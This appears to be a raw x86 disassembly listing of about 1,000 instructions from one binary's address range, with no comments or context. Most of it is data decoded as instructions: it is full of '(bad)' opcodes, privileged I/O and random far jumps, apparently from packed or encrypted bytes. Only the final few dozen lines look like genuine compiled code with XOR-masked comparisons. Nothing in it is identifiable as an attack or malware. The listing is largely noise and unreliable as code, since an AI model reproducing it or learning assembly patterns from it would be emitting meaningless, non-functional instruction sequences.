  416437:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416438:	imul   esi,ecx,0x78
  41643b:	aas    
  41643c:	pop    eax
  41643d:	in     al,0x2
  41643f:	rcr    DWORD PTR [eax],cl
  416441:	mov    ds:0x5be5eac3,eax
  416446:	sub    eax,0x59b1866d
  41644b:	sub    DWORD PTR [eax-0x44a39963],esi
  416451:	push   cs
  416452:	pop    eax
  416453:	or     DWORD PTR [ebp+ebp*8+0xfa870cb],0x11
  41645b:	pop    ebx
  41645c:	jg     0x41641d
  41645e:	adc    BYTE PTR [ecx],dh
  416460:	xchg   BYTE PTR [eax+0x5f],bh
  416463:	push   ss
  416464:	adc    ebp,DWORD PTR [edx]
  416466:	ins    BYTE PTR es:[edi],dx
  416467:	dec    edi
  416468:	xchg   ecx,eax
  416469:	fiadd  DWORD PTR [esi-0x75]
  41646c:	(bad)  
  41646d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41646e:	pop    eax
  41646f:	pop    ebp
  416470:	jecxz  0x4164cc
  416472:	jb     0x41640c
  416474:	int3   
  416475:	mov    dl,0xe4
  416477:	sbb    al,0x91
  416479:	packsswb mm3,QWORD PTR [edx+0xb]
  41647d:	jo     0x4164c9
  41647f:	imul   DWORD PTR fs:[ebx]
  416482:	(bad)  
  416483:	cwde   
  416484:	mov    bh,0x6b
  416486:	pop    edi
  416487:	or     ecx,DWORD PTR [edx-0x348751a]
  41648d:	leave  
  41648e:	add    BYTE PTR [ebx-0x30a577fd],0x4e
  416495:	mov    ebx,0xe54b727f
  41649a:	fiadd  DWORD PTR [ebp+0x59c02870]
  4164a0:	icebp  
  4164a1:	jmp    0x41645d
  4164a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4164a4:	sbb    eax,0x9d43d75
  4164a9:	add    al,0x9f
  4164ab:	inc    ebp
  4164ac:	pop    ebp
  4164ad:	mov    ebp,0x6f7e37d9
  4164b2:	enter  0xdd3f,0x2
  4164b6:	jmp    0x4164b1
  4164b8:	(bad)
  4164bb:	lahf   
  4164bc:	pop    eax
  4164bd:	and    eax,DWORD PTR ds:0xb7d4a991
  4164c3:	icebp  
  4164c4:	cwde   
  4164c5:	and    ecx,ebx
  4164c7:	jle    0x4164ce
  4164c9:	shr    BYTE PTR [esi+edx*1-0x206ae6d4],cl
  4164d0:	xor    eax,0xbb223bfa
  4164d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4164d6:	sbb    eax,0x4c8d7adb
  4164db:	sahf   
  4164dc:	inc    edx
  4164dd:	adc    DWORD PTR [ebp+0x45],esp
  4164e0:	ins    DWORD PTR es:[edi],dx
  4164e1:	pop    ss
  4164e2:	xor    BYTE PTR [edx-0x3eec780d],dl
  4164e8:	add    al,0xc0
  4164ea:	daa    
  4164eb:	nop
  4164ec:	punpckhbw mm6,QWORD PTR [esi]
  4164ef:	pop    ss
  4164f0:	adc    esp,DWORD PTR [eax+ecx*8-0x2c228636]
  4164f7:	mov    ebx,0xf9d31dd5
  4164fc:	es cmp al,0x0
  4164ff:	xor    BYTE PTR [esi-0x26e08e7f],bl
  416505:	aas    
  416506:	jne    0x416547
  416508:	and    BYTE PTR [edi-0x5345c7ab],ch
  41650e:	sub    DWORD PTR [esi+0x1f470eea],ebx
  416514:	fs sbb ecx,0x2e0690db
  41651b:	nop
  41651c:	gs aaa 
  41651e:	ret    
  41651f:	sbb    ecx,DWORD PTR [ebp-0x7]
  416522:	fistp  QWORD PTR [edi-0x6f3bd6a]
  416528:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416529:	xor    cl,BYTE PTR [eax+0x21]
  41652c:	mov    al,ds:0xbb5403ca
  416531:	mov    ecx,0x215a26e8
  416536:	mov    cl,0x5c
  416538:	pop    ebp
  416539:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41653a:	aas    
  41653b:	push   edi
  41653c:	mov    bh,BYTE PTR [eax]
  41653e:	jns    0x41653a
  416540:	lahf   
  416541:	jns    0x4165a9
  416543:	push   0xffffffc3
  416545:	jb     0x416584
  416547:	test   BYTE PTR [ecx-0x1b44c3a4],ah
  41654d:	nop
  41654e:	clc    
  41654f:	ins    DWORD PTR es:[edi],dx
  416550:	push   ss
  416551:	inc    edi
  416552:	adc    esp,0x79194167
  416558:	test   DWORD PTR [ebx-0x2],edx
  41655b:	loopne 0x416592
  41655d:	mov    ebx,0x77b17e89
  416562:	shl    esp,0x8d
  416565:	pop    esi
  416566:	enter  0xf2dd,0x77
  41656a:	pop    edi
  41656b:	div    DWORD PTR [edx+0x44d3077a]
  416571:	mov    eax,ds:0x92f33733
  416576:	cmp    esi,DWORD PTR [ebx]
  416578:	sbb    DWORD PTR [ebx+0x68a91d17],esp
  41657e:	push   esp
  41657f:	pop    ebx
  416580:	adc    edi,DWORD PTR [ebx]
  416582:	repnz inc ebp
  416584:	push   esp
  416585:	ins    DWORD PTR es:[edi],dx
  416586:	fdiv   DWORD PTR [ebx-0x2f]
  416589:	sahf   
  41658a:	lds    edx,FWORD PTR [esi]
  41658c:	data16 add cl,cl
  41658f:	cli    
  416590:	xchg   BYTE PTR [ebp-0x72f90324],bh
  416596:	into   
  416597:	das    
  416598:	call   0xe54388dd
  41659d:	push   es
  41659e:	push   ecx
  41659f:	xor    BYTE PTR [esi+0x7f],0x66
  4165a3:	xchg   ecx,eax
  4165a4:	dec    ecx
  4165a5:	scas   al,BYTE PTR es:[edi]
  4165a6:	int3   
  4165a7:	je     0x416539
  4165a9:	jns    0x41657b
  4165ab:	test   al,0xfd
  4165ad:	adc    ah,BYTE PTR [ecx+0x2834bb45]
  4165b3:	cs aad 0x47
  4165b6:	xor    DWORD PTR [edi+0x274bd36a],edx
  4165bc:	mov    esi,0xc74a462d
  4165c1:	pusha  
  4165c2:	inc    ebp
  4165c3:	outs   dx,BYTE PTR ds:[esi]
  4165c4:	push   ebx
  4165c5:	les    edi,FWORD PTR ds:0xf31cf507
  4165cb:	in     eax,dx
  4165cc:	push   esp
  4165cd:	mov    cl,0x50
  4165cf:	pop    esp
  4165d0:	xchg   esi,eax
  4165d1:	mov    ecx,0xad888ee3
  4165d6:	out    dx,eax
  4165d7:	daa    
  4165d8:	mov    WORD PTR [eax],ss
  4165da:	push   edi
  4165db:	(bad)  
  4165dc:	fimul  DWORD PTR [eax-0x35]
  4165df:	test   ebx,edi
  4165e1:	pusha  
  4165e2:	iret   
  4165e3:	int    0x2f
  4165e5:	(bad)  
  4165e6:	mov    bh,0x4c
  4165e8:	imul   ebp,DWORD PTR [esi],0xc1d1e10f
  4165ee:	mov    dl,0xb5
  4165f0:	pop    esi
  4165f1:	retf   
  4165f2:	das    
  4165f3:	outs   dx,DWORD PTR ds:[esi]
  4165f4:	pop    es
  4165f5:	je     0x416609
  4165f7:	sar    DWORD PTR [esi-0x6f],0x57
  4165fb:	xchg   edi,eax
  4165fc:	jne    0x416633
  4165fe:	sbb    ah,BYTE PTR [ebx-0xb704eb5]
  416604:	xor    DWORD PTR [eax-0x73],eax
  416607:	and    BYTE PTR [esi-0x6a],dl
  41660a:	xor    esi,DWORD PTR ds:0xbf64d177
  416610:	or     BYTE PTR [ebp-0x55623971],0x98
  416617:	pop    edi
  416618:	push   edx
  416619:	pop    esp
  41661a:	ins    DWORD PTR es:[edi],dx
  41661b:	inc    eax
  41661c:	and    ebp,DWORD PTR [edx+esi*1-0x46e7f821]
  416623:	mov    ebx,0x1d092b10
  416628:	xor    al,0xc8
  41662a:	mov    dh,0xb8
  41662c:	leave  
  41662d:	cmp    ah,BYTE PTR [ebx-0x3135969d]
  416633:	mov    esi,edx
  416635:	pop    es
  416636:	and    esp,DWORD PTR [esi+0x45898018]
  41663c:	cmp    eax,0xc513d600
  416641:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416642:	cmp    eax,0xed1e7ad9
  416647:	fild   DWORD PTR [ebx]
  416649:	cld    
  41664a:	add    esi,DWORD PTR [esi]
  41664c:	ss leave 
  41664e:	or     cl,BYTE PTR [edi-0x5e]
  416651:	ret    0x57e1
  416654:	jbe    0x416636
  416656:	inc    edx
  416657:	leave  
  416658:	and    BYTE PTR [esi-0x1b71de31],ch
  41665e:	sub    cl,BYTE PTR [edx+0x69]
  416661:	mov    WORD PTR [edx+0x51],?
  416664:	in     eax,0x78
  416666:	and    al,0xb8
  416668:	mov    al,ds:0x49fdd2b
  41666d:	sti    
  41666e:	xor    ebp,DWORD PTR [esi-0xc]
  416671:	jge    0x41666a
  416673:	pop    esi
  416674:	xchg   esp,eax
  416675:	dec    DWORD PTR [ebx+0x4b]
  416678:	xchg   edx,eax
  416679:	mov    bl,0x55
  41667b:	fiadd  WORD PTR [ebx-0x17]
  41667e:	mov    edi,0x7a5acc46
  416683:	in     al,0x9f
  416685:	cmp    BYTE PTR [edx],0x9e
  416688:	popa   
  416689:	bound  edi,QWORD PTR [edx-0x78fc7655]
  41668f:	jecxz  0x416678
  416691:	dec    esp
  416692:	add    al,0x20
  416694:	(bad)  
  416695:	jle    0x4166c7
  416697:	je     0x41668b
  416699:	mov    eax,0xddbd40f0
  41669e:	test   al,0x61
  4166a0:	inc    ebp
  4166a1:	or     eax,DWORD PTR [esi-0x6c2c6a7a]
  4166a7:	cli    
  4166a8:	ffreep st(6)
  4166aa:	jmp    0x9c8c:0x3408e586
  4166b1:	inc    eax
  4166b2:	pop    ss
  4166b3:	mov    ecx,0xfae050c4
  4166b8:	out    0x68,eax
  4166ba:	or     al,0xa
  4166bc:	fistp  QWORD PTR [ebx+0x14fa2e87]
  4166c2:	inc    ebp
  4166c3:	dec    eax
  4166c4:	mov    ?,WORD PTR [esi+0x7ac04d37]
  4166ca:	xchg   BYTE PTR [edi-0x443647c7],al
  4166d0:	outs   dx,BYTE PTR ds:[esi]
  4166d1:	add    al,0xec
  4166d3:	int3   
  4166d4:	jmp    0x40ce:0x99a1aa16
  4166db:	or     al,0x95
  4166dd:	mov    edi,0x32637404
  4166e2:	and    DWORD PTR [edi-0xb],0xc361fe0f
  4166e9:	sbb    eax,0xc8b4410b
  4166ee:	in     eax,0xf0
  4166f0:	clc    
  4166f1:	pop    ebp
  4166f2:	push   edx
  4166f3:	sbb    DWORD PTR [ebp-0x2175eec4],0x9510e379
  4166fd:	jle    0x4166ab
  4166ff:	push   ss
  416700:	mov    BYTE PTR [ebp+0x3fc783cf],ch
  416706:	clc    
  416707:	pusha  
  416708:	dec    edi
  416709:	sbb    DWORD PTR [eax+0x6bbfd68],eax
  41670f:	retf   
  416710:	cli    
  416711:	(bad)  
  416713:	mov    dl,0x38
  416715:	dec    edi
  416716:	sub    al,0xd3
  416718:	dec    edi
  416719:	xchg   ebp,eax
  41671a:	in     al,0x6e
  41671c:	xchg   esi,eax
  41671d:	lock out 0x48,eax
  416720:	cli    
  416721:	leave  
  416722:	ins    DWORD PTR es:[edi],dx
  416723:	cmp    esp,DWORD PTR [edi-0x45]
  416726:	mov    DWORD PTR [eax-0x12769cfc],eax
  41672c:	add    eax,0xe91010f4
  416731:	pcmpgtd mm1,QWORD PTR [eax+0x15916ece]
  416738:	mov    ds:0xbaf93421,eax
  41673d:	push   eax
  41673e:	gs sti 
  416740:	add    al,0xa5
  416742:	jnp    0x416740
  416744:	and    dh,al
  416746:	loopne 0x4167b2
  416748:	ret    0x96cb
  41674b:	cmp    edx,ebp
  41674d:	jb     0x4167b5
  41674f:	(bad)  
  416750:	loope  0x4167bc
  416752:	and    DWORD PTR [esi+edi*4-0x3b2c8d11],0x635ff3f5
  41675d:	xchg   BYTE PTR [ecx-0x47485ccd],al
  416763:	push   ss
  416764:	enter  0x4114,0x84
  416768:	jp     0x41671e
  41676a:	(bad)  
  41676b:	(bad)  
  41676c:	inc    eax
  41676d:	inc    ecx
  41676e:	jp     0x4167ee
  416770:	xchg   edx,eax
  416771:	mov    eax,ds:0x3935cc24
  416776:	and    eax,0x94c54796
  41677b:	ror    DWORD PTR [esi-0xc7798fb],1
  416781:	clc    
  416782:	mov    ch,0x5e
  416784:	rol    BYTE PTR [esi-0x28],0xb4
  416788:	retf   0x109d
  41678b:	sbb    al,0x29
  41678d:	mov    ebp,0x69f7fa2d
  416792:	test   BYTE PTR [esi-0x48],bh
  416795:	ins    BYTE PTR es:[edi],dx
  416796:	mov    dh,0x2f
  416798:	rcl    BYTE PTR [edx+0x2],1
  41679b:	retf   0xbbb1
  41679e:	inc    edx
  41679f:	lods   eax,DWORD PTR ds:[esi]
  4167a0:	xor    DWORD PTR [esi],0xf18ad28d
  4167a6:	fistp  DWORD PTR [esi+edx*4+0x197c0b92]
  4167ad:	jbe    0x416829
  4167af:	in     eax,0x4f
  4167b1:	jle    0x416782
  4167b3:	mov    ebx,0x5ecc44b4
  4167b8:	mov    bh,0x9d
  4167ba:	into   
  4167bb:	pop    DWORD PTR [edx]
  4167bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4167be:	cmp    eax,0xe4617a3
  4167c3:	les    ebp,FWORD PTR [ebx]
  4167c5:	outs   dx,BYTE PTR ds:[esi]
  4167c6:	xchg   esi,eax
  4167c7:	add    al,bh
  4167c9:	and    DWORD PTR [eax-0x7f61f683],ebp
  4167cf:	imul   esi,DWORD PTR [esi],0x60ee17a5
  4167d5:	inc    ecx
  4167d6:	push   ss
  4167d7:	cmp    BYTE PTR [ecx+0x5f7bb27f],bh
  4167dd:	aad    0x18
  4167df:	dec    esi
  4167e0:	mov    edx,0xab7e488d
  4167e5:	push   esp
  4167e6:	jne    0x416827
  4167e8:	stos   DWORD PTR es:[edi],eax
  4167e9:	dec    DWORD PTR [ebx]
  4167eb:	cmc    
  4167ec:	stos   DWORD PTR es:[edi],eax
  4167ed:	mov    bh,0xca
  4167ef:	inc    ax
  4167f1:	push   esp
  4167f2:	jb     0x416859
  4167f4:	push   ebp
  4167f5:	out    0xa6,al
  4167f7:	ficomp DWORD PTR [ebp+0x11d0f0d6]
  4167fd:	sar    bl,1
  4167ff:	fsqrt  
  416801:	jg     0x416812
  416803:	inc    ecx
  416804:	in     al,dx
  416805:	dec    ecx
  416806:	mov    edi,0xc834006d
  41680b:	jg     0x416794
  41680d:	inc    edi
  41680e:	xchg   edi,eax
  41680f:	jae    0x4167f3
  416811:	sti    
  416812:	std    
  416813:	push   ecx
  416814:	cs out dx,al
  416816:	pop    es
  416817:	pop    ebx
  416818:	dec    esi
  416819:	(bad)  
  41681a:	gs jb  0x4167d5
  41681d:	mov    al,ds:0x77419a1e
  416822:	(bad)  
  416823:	stos   DWORD PTR es:[edi],eax
  416824:	xchg   edx,eax
  416825:	cdq    
  416826:	das    
  416827:	hlt    
  416828:	adc    al,0x2
  41682a:	or     cl,cl
  41682c:	xchg   BYTE PTR [ecx+0x1f775e25],ch
  416832:	add    DWORD PTR [ecx-0x6cd63ad7],ecx
  416838:	jns    0x4167f5
  41683a:	outs   dx,BYTE PTR ds:[esi]
  41683b:	and    DWORD PTR [ecx-0x7303c920],0x82f244f6
  416845:	cmp    DWORD PTR [esi+0x2f],eax
  416848:	or     dl,ch
  41684a:	xchg   edi,ebp
  41684c:	sbb    ch,BYTE PTR [ebx-0x60]
  41684f:	ret    
  416850:	add    ch,al
  416852:	outs   dx,DWORD PTR ds:[esi]
  416853:	add    bl,ch
  416855:	or     al,0x9
  416857:	aam    0x42
  416859:	ss test bh,0x70
  41685d:	addr16 and eax,0xa75dc417
  416863:	(bad)  
  416864:	fld    QWORD PTR [ebx+0x54]
  416867:	ret    
  416868:	or     eax,0x60df1288
  41686d:	ret    0x96d0
  416870:	aam    0x6d
  416872:	and    BYTE PTR [eax+eax*1-0xb],ch
  416876:	js     0x4168bc
  416878:	aad    0x5e
  41687a:	and    BYTE PTR [ecx],dh
  41687c:	test   cl,cl
  41687e:	pop    edi
  41687f:	(bad)  [esi+0x26]
  416882:	(bad)  
  416883:	sbb    al,0x38
  416885:	or     edi,DWORD PTR [ebx-0x54719f54]
  41688b:	pop    es
  41688c:	sahf   
  41688d:	mov    eax,ds:0x3d3c619d
  416892:	das    
  416893:	(bad)  
  416894:	sti    
  416895:	or     eax,0xc6022818
  41689a:	sub    DWORD PTR [edx-0x4c6b10e2],ebp
  4168a0:	pop    ebx
  4168a1:	aam    0x1d
  4168a3:	jne    0x4168c6
  4168a5:	test   al,0xec
  4168a7:	adc    edi,edi
  4168a9:	push   ecx
  4168aa:	sbb    DWORD PTR [ecx+0x59cf5e42],edi
  4168b0:	ficomp DWORD PTR [ebp-0x3b79f313]
  4168b6:	ja     0x41684a
  4168b8:	mov    edx,0x5cece6e9
  4168bd:	outs   dx,DWORD PTR ds:[esi]
  4168be:	cmp    eax,0x8346d61e
  4168c3:	inc    esi
  4168c4:	mov    ds:0x28a60c89,al
  4168c9:	test   DWORD PTR [edi-0x2e2329e1],edi
  4168cf:	adc    DWORD PTR [edx],ebx
  4168d1:	cmp    ecx,DWORD PTR [ecx+0x7058e28a]
  4168d7:	cs jge 0x416893
  4168da:	jmp    0x26b3:0xe264db5b
  4168e1:	add    al,0x59
  4168e3:	adc    dh,BYTE PTR [bp+si+0x44]
  4168e7:	xchg   edi,eax
  4168e8:	inc    edx
  4168e9:	repz data16 add BYTE PTR [ebx+eiz*4+0x3605fc3d],bh
  4168f2:	mov    ebx,0x4199593c
  4168f7:	shl    BYTE PTR [edx+0x7e],0xb2
  4168fb:	jg     0x416977
  4168fd:	shl    BYTE PTR [ebx+0x53],0xa5
  416901:	dec    ebp
  416902:	or     BYTE PTR [eax-0x4],bh
  416905:	shl    DWORD PTR [eax-0x69],0xac
  416909:	and    dh,BYTE PTR [eax-0x25b63ed5]
  41690f:	dec    esp
  416910:	jmp    FWORD PTR [eax-0x38a8d293]
  416916:	jnp    0x416944
  416918:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  41691a:	test   DWORD PTR [esi-0x38],0x6499ce6c
  416921:	sbb    DWORD PTR [edi+edx*1-0x16f5a4e1],0x68
  416929:	outs   dx,DWORD PTR ds:[esi]
  41692a:	mov    edx,0x2d7bd984
  41692f:	dec    edx
  416930:	xchg   esi,eax
  416931:	in     al,dx
  416932:	jo     0x416973
  416934:	sbb    BYTE PTR [ecx+0x1a06d27c],ch
  41693a:	aas    
  41693b:	xchg   edi,eax
  41693c:	retf   0xf7e
  41693f:	rol    DWORD PTR [esi+ebp*4-0x5c],cl
  416943:	jb     0x41698c
  416945:	shl    BYTE PTR [ebp-0x38],cl
  416948:	es std 
  41694a:	dec    eax
  41694b:	lahf   
  41694c:	fucomi st,st(2)
  41694e:	les    edi,FWORD PTR [ecx-0x77]
  416951:	push   edx
  416952:	jecxz  0x416991
  416954:	ds mov eax,0x3fd967d2
  41695a:	sbb    eax,0x2c5169af
  41695f:	xchg   esp,eax
  416960:	sub    ch,BYTE PTR [edx-0x7a]
  416963:	pop    esi
  416964:	imul   ebx,DWORD PTR [edi-0x5c],0x9a45601b
  41696b:	inc    ebp
  41696c:	or     DWORD PTR [ebx+0x1620b45e],ebp
  416972:	jne    0x4169cf
  416974:	inc    edx
  416975:	push   ds
  416976:	lea    esi,[edi+0x6a]
  416979:	dec    esi
  41697a:	xchg   esp,eax
  41697b:	xchg   edi,eax
  41697c:	sub    BYTE PTR [ebp-0x1672e3ed],dh
  416982:	lods   al,BYTE PTR ds:[esi]
  416983:	dec    edi
  416984:	inc    ecx
  416985:	fs ins DWORD PTR es:[edi],dx
  416987:	test   al,0x71
  416989:	mov    edx,0xbd8c16a1
  41698e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41698f:	xchg   ebx,eax
  416990:	and    al,cl
  416992:	in     al,dx
  416993:	hlt    
  416994:	inc    eax
  416995:	js     0x416924
  416997:	sbb    al,0xcc
  416999:	adc    al,0xc7
  41699b:	(bad)  
  41699d:	inc    edi
  41699e:	push   edx
  41699f:	sub    al,dh
  4169a1:	push   edi
  4169a2:	jmp    0x416937
  4169a4:	or     bh,BYTE PTR [ebp-0x13]
  4169a7:	push   cs
  4169a8:	sub    BYTE PTR [esi+0x4a],dl
  4169ab:	test   BYTE PTR [ebp-0x63],ah
  4169ae:	sbb    ebx,esp
  4169b0:	call   0x9eb3:0x83c3a20e
  4169b7:	inc    edx
  4169b8:	jne    0x4169c0
  4169ba:	fdivr  QWORD PTR [edx]
  4169bc:	es xchg ecx,eax
  4169be:	fisubr DWORD PTR [esi+eax*8-0x54]
  4169c2:	jne    0x416a3e
  4169c4:	dec    edi
  4169c5:	inc    eax
  4169c6:	jle    0x41697a
  4169c8:	icebp  
  4169c9:	hlt    
  4169ca:	leave  
  4169cb:	js     0x416961
  4169cd:	sub    DWORD PTR [edi+0x57579605],eax
  4169d3:	in     eax,dx
  4169d4:	push   esp
  4169d5:	les    esp,FWORD PTR [ebx+0x2356392b]
  4169db:	add    cl,BYTE PTR ds:0xb34581e1
  4169e1:	rcl    BYTE PTR [ecx],0x90
  4169e4:	xchg   BYTE PTR [eax],bl
  4169e6:	sub    ah,BYTE PTR [ecx-0x7e5a8105]
  4169ec:	mov    ebx,0x7f0007c2
  4169f1:	sub    ebx,DWORD PTR [edx-0x6d9dc318]
  4169f7:	lea    edx,[ecx]
  4169f9:	mov    edi,0x972c9f34
  4169fe:	fsubr  DWORD PTR [eax-0x44f1ad64]
  416a04:	dec    edx
  416a05:	inc    ecx
  416a06:	lods   al,BYTE PTR ds:[esi]
  416a07:	(bad)  
  416a08:	test   eax,0x970834d7
  416a0d:	fdivp  st(5),st
  416a0f:	(bad)  
  416a10:	stc    
  416a11:	lods   eax,DWORD PTR ds:[esi]
  416a12:	add    ecx,DWORD PTR [ebx+0x54]
  416a15:	mov    bh,0xaf
  416a17:	repz push edx
  416a19:	lahf   
  416a1a:	push   cs
  416a1b:	ja     0x416a77
  416a1d:	(bad)  
  416a1e:	aaa    
  416a1f:	std    
  416a20:	cmp    ebx,DWORD PTR [eax+0x28]
  416a23:	lds    edx,FWORD PTR es:[eax+0x141e6931]
  416a2a:	mov    esp,0xae8e36e1
  416a2f:	or     eax,0xbac61155
  416a34:	inc    edx
  416a35:	cli    
  416a36:	cmp    eax,0x4693221a
  416a3b:	xchg   ebx,eax
  416a3c:	cmp    bh,cl
  416a3e:	fist   WORD PTR [edx-0x17]
  416a41:	pop    edi
  416a42:	push   eax
  416a43:	jmp    0xad41:0x1df271f7
  416a4a:	cmp    DWORD PTR [eax-0xa07fcf5],edx
  416a50:	imul   esi,DWORD PTR [ebp+0x6e],0xa4cf4763
  416a57:	das    
  416a58:	jns    0x416ab4
  416a5a:	jge    0x416a70
  416a5c:	js     0x416a92
  416a5e:	dec    edx
  416a5f:	xlat   BYTE PTR ds:[ebx]
  416a60:	mov    esi,0xd3bc4920
  416a65:	and    al,0x29
  416a67:	inc    edx
  416a68:	mov    dh,0xee
  416a6a:	mov    ecx,0xb99909e4
  416a6f:	mul    BYTE PTR [ecx+0x5fa28ca2]
  416a75:	mov    al,0xb
  416a77:	sbb    ebp,esp
  416a79:	int3   
  416a7a:	dec    esp
  416a7b:	imul   ecx,DWORD PTR [esi],0xc89a17e5
  416a81:	cmc    
  416a82:	mov    dl,0x6d
  416a84:	(bad)  
  416a85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a86:	mov    fs,eax
  416a88:	lea    edi,[edx-0x4]
  416a8b:	sbb    bl,BYTE PTR [edi+0x5dce3c9c]
  416a91:	mov    ds:0x8fdfba8e,eax
  416a96:	test   bl,0xab
  416a99:	sti    
  416a9a:	cmp    al,al
  416a9c:	lock (bad) 
  416a9e:	fstp   DWORD PTR [edi-0xa46624f]
  416aa4:	jbe    0x416a6a
  416aa6:	lea    esp,[edi]
  416aa8:	sbb    DWORD PTR [esi+edx*2-0x7c],eax
  416aac:	shl    BYTE PTR ss:[ecx-0x272290a9],0x2a
  416ab4:	shl    BYTE PTR ss:[edx],1
  416ab7:	adc    BYTE PTR [edx+0x78],al
  416aba:	das    
  416abb:	retf   
  416abc:	xor    edi,ebp
  416abe:	pop    ebx
  416abf:	fwait
  416ac0:	mov    ebp,0xbbed0819
  416ac5:	out    dx,al
  416ac6:	adc    DWORD PTR [ebx],edx
  416ac8:	retf   
  416ac9:	js     0x416ad3
  416acb:	fcom   DWORD PTR [eax+0x68]
  416ace:	test   DWORD PTR [esi],edi
  416ad0:	sub    edx,DWORD PTR [esi-0x16]
  416ad3:	pop    ecx
  416ad4:	mov    eax,0x6122a1e9
  416ad9:	fcmove st,st(7)
  416adb:	lea    ebp,[esp+eax*8-0x23]
  416adf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416ae0:	hlt    
  416ae1:	into   
  416ae2:	mov    ?,WORD PTR [edx+0x1813b60e]
  416ae8:	fbstp  TBYTE PTR [edi]
  416aea:	push   ecx
  416aeb:	ins    BYTE PTR es:[edi],dx
  416aec:	int    0xec
  416aee:	out    dx,al
  416aef:	mov    eax,ds:0x7887358a
  416af4:	push   ebp
  416af5:	xor    DWORD PTR [edx],esi
  416af7:	sbb    edx,DWORD PTR [ecx+0x798650fb]
  416afd:	call   0x1516:0xbe4a5e75
  416b04:	call   0x894f:0xd800e8a9
  416b0b:	fcomp  QWORD PTR [esi+0xc0225fa]
  416b11:	ret    0x5d9
  416b14:	aam    0x13
  416b16:	icebp  
  416b17:	sbb    ax,0x3f9f
  416b1b:	out    dx,al
  416b1c:	inc    ecx
  416b1d:	scas   al,BYTE PTR es:[edi]
  416b1e:	inc    esi
  416b1f:	mov    ecx,0x64e0805a
  416b24:	leave  
  416b25:	or     BYTE PTR ds:0x9790fd99,bh
  416b2b:	loope  0x416b3b
  416b2d:	es cwde 
  416b2f:	and    eax,0xbbe8d336
  416b34:	les    eax,FWORD PTR fs:[edi]
  416b37:	xchg   edx,eax
  416b38:	push   esi
  416b39:	std    
  416b3a:	cmp    esp,esi
  416b3c:	inc    ebp
  416b3d:	xchg   edx,eax
  416b3e:	test   eax,0xc0efb2d5
  416b43:	sahf   
  416b44:	and    BYTE PTR ds:0xb3a4a118,dl
  416b4a:	push   0x110d4712
  416b4f:	adc    DWORD PTR [ebx-0x19d8631e],ebp
  416b55:	pop    ds
  416b56:	sub    eax,DWORD PTR [ecx]
  416b58:	cs push 0x5a
  416b5b:	int3   
  416b5c:	ffree  st(4)
  416b5e:	pop    ebp
  416b5f:	cmp    DWORD PTR [ebp+0x5d9806ce],0x4c33c60b
  416b69:	mov    edi,0x5027003
  416b6e:	mov    dh,0x4f
  416b70:	ja     0x416b2b
  416b72:	mov    eax,ds:0x98407c88
  416b77:	cs (bad) 
  416b79:	jmp    0x416b3f
  416b7b:	leave  
  416b7c:	test   eax,0x4e67ede3
  416b81:	ror    DWORD PTR [ebx-0x48],1
  416b84:	enter  0x388,0xf1
  416b88:	or     al,0x4
  416b8a:	and    DWORD PTR [edx],edx
  416b8c:	cmp    eax,0x5348f49
  416b91:	and    BYTE PTR [edx-0x63],cl
  416b94:	adc    cl,BYTE PTR [edi]
  416b96:	into   
  416b97:	sbb    al,ah
  416b99:	cli    
  416b9a:	dec    edx
  416b9b:	push   0xffffffaf
  416b9d:	xchg   edx,eax
  416b9e:	mov    dl,0xfe
  416ba0:	dec    ebp
  416ba1:	jl     0x416c12
  416ba3:	in     eax,dx
  416ba4:	adc    DWORD PTR [ecx+0x39db4683],esp
  416baa:	lods   eax,DWORD PTR ds:[esi]
  416bab:	cmp    eax,DWORD PTR [ecx]
  416bad:	icebp  
  416bae:	cmp    esi,esi
  416bb0:	mov    ds:0x2c69a531,eax
  416bb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416bb6:	cwde   
  416bb7:	bound  ebx,QWORD PTR [esp+eax*4]
  416bba:	push   esp
  416bbb:	push   ds
  416bbc:	and    al,0xc6
  416bbe:	dec    ecx
  416bbf:	dec    edi
  416bc0:	dec    ebp
  416bc1:	cli    
  416bc2:	lock frstor [edx+0x64]
  416bc6:	and    DWORD PTR [esp+ebx*4],esi
  416bc9:	mov    ah,0xd5
  416bcb:	or     esp,DWORD PTR [ebx+0x20b94b91]
  416bd1:	lds    esp,FWORD PTR [di+0x3f]
  416bd5:	outs   dx,DWORD PTR ds:[esi]
  416bd6:	into   
  416bd7:	(bad)
  416bda:	mov    edx,DWORD PTR [ebp+0x8]
  416bdd:	xor    edx,eax
  416bdf:	add    edx,esi
  416be1:	jne    0x414733
  416be7:	mov    edx,DWORD PTR [ebp-0xc]
  416bea:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  416bf1:	mov    bl,BYTE PTR [ebp-0x1]
  416bf4:	cmp    dl,bl
  416bf6:	je     0x419033
  416bfc:	mov    ecx,DWORD PTR [ebp-0x5c]
  416bff:	mov    edx,DWORD PTR [ebp-0xc]
  416c02:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  416c09:	mov    ebx,DWORD PTR [ebp+0xc]
  416c0c:	xor    ecx,eax
  416c0e:	cmp    dl,BYTE PTR [ebx+ecx*1+0x3272f1]
  416c15:	jne    0x41b4c6
  416c1b:	mov    ecx,DWORD PTR [ebp-0x5c]
  416c1e:	mov    edx,DWORD PTR [ebp+0xc]
  416c21:	xor    ecx,eax
  416c23:	movsx  ecx,BYTE PTR [edx+ecx*1+0x3272f1]
  416c2b:	mov    edx,DWORD PTR [ebp-0x18]
  416c2e:	xor    edx,eax
  416c30:	add    edx,esi
  416c32:	cmp    ecx,edx
  416c34:	mov    ecx,DWORD PTR [ebp-0x14]
  416c37:	mov    DWORD PTR [ebp+0x8],ecx
  416c3a:	mov    ecx,DWORD PTR [ebp+0x8]
  416c3d:	je     0x421feb
  416c43:	xor    ecx,eax
  416c45:	add    ecx,esi
  416c47:	mov    ecx,0x242ebc9
  416c4c:	je     0x4190bb
